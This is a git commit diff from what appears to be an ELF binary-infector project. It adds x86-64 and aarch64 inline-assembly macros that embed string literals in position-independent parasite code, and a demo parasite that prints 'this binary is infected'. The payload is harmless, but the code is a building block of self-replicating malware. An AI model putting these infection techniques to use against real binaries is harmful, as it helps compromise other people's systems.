5842b3fea194bc9ff0f1188b1e3ad8b5cc0f6625
Tim Tianyang Chen <soapcn@gmail.com>
2022-07-06 16:06:26 -0700

    working string literal for x86

--- common/macros.hh
+++ common/macros.hh
@@ -53,9 +53,22 @@
 #define CHECK_GE(a, b) CHECK_LT(b, a)
 
 #if defined(__x86_64__)
-#error "not supported"
+#define STR_LITERAL(str, literal) \
+  asm volatile(                   \
+      "jmp 1f\n"                  \
+      "2:\n"                      \
+      "pop %0\n"                  \
+      "jmp 3f\n"                  \
+      "1:\n"                      \
+      "call 2b\n"                 \
+      ".asciz \"" literal         \
+      "\"\n"                      \
+      "3:\n"                      \
+      : "=r"(str)                 \
+      :);
+
 #elif defined(__aarch64__)
-// Unfortuanly arm must run instructions aligned to 4byte address. The b .out
+// Unfortunately arm must run instructions aligned to 4byte address. The b .out
 // could be mis-aligned. If linker complains, wrap your literal with these
 // macros.
 #define PAD1(literal) literal "\\0"
@@ -66,35 +79,20 @@
 // this is basically the following buffer overflow trick, using bl
 // to automatically load str address to x30. This is necessary to
 // having string literals in .rodata.
-/*   asm volatile(                     \
-      "stp x29, x30, [sp, #-16]!\n"    \ # save return adr
-      "b .inf\n"                       \ -------|
-      ".name_call:\n"                  \ <----- | -|
-      "mov %0, x30\n"                  \        |  |
-      "ldp x29, x30, [sp], #16\n"      \        |  |
-      "b .out\n"                       \ ------ | -|-|
-      ".inf:\n"                        \ <------|  | |
-      "bl .name_call\n"                \ ----------| # auto load str to x30
-      ".t: .asciz \"" literal "\"\n"   \             |
-      ".out:\n"                        \ <-----------|
-      : "=r"(str)                      \
-      :);
-*/
-
-#define STR_LITERAL(str, literal)                                       \
-  static_assert(                                                        \
-      sizeof(literal) % 4 == 3,                                         \
-      "Please padd the string literal with PADx(...) because the next " \
-      "instruction will not be aligned.");                              \
-  asm volatile(                                                         \
-      ".inst 0xa9bf7bfd\n"                                              \
-      ".inst 0x14000004\n"                                              \
-      ".inst 0xaa1e03f3\n"                                              \
-      ".inst 0xa8c17bfd\n"                                              \
-      ".inst 0x14000004\n"                                              \
-      ".inst 0x97fffffd\n"                                              \
-      ".asciz \"" literal "\"\n"                                        \
-      : "=r"(str)                                                       \
+#define STR_LITERAL(str, literal)   \
+  asm volatile(                     \
+      "stp x29, x30, [sp, #-16]!\n" \
+      "b 1f\n"                      \
+      "2:\n"                        \
+      "mov %0, x30\n"               \
+      "ldp x29, x30, [sp], #16\n"   \
+      "b 3f\n"                      \
+      "1:\n"                        \
+      "bl 2b\n"                     \
+      ".asciz \"" literal           \
+      "\"\n"                        \
+      "3:\n"                        \
+      : "=r"(str)                   \
       :);
 
 #endif
--- infector/so.cc
+++ infector/so.cc
@@ -4,6 +4,21 @@
 
 void parasite_main() {
   const char* str = nullptr;
-  STR_LITERAL(str, PAD3("123\n"));
+  /*
+  asm volatile(
+      "jmp inf\n"
+      "name_call:\n"
+      "pop %0\n"
+      "jmp out\n"
+      "inf:\n"
+      "call name_call\n"
+      ".asciz \""
+      "1234"
+      "\"\n"
+      "out:\n"
+      : "=r"(str)
+      :);
+    */
+  STR_LITERAL(str, "this binary is infected\\n\\0\\0\\0");
   write(1, str, strlen(str));
 }
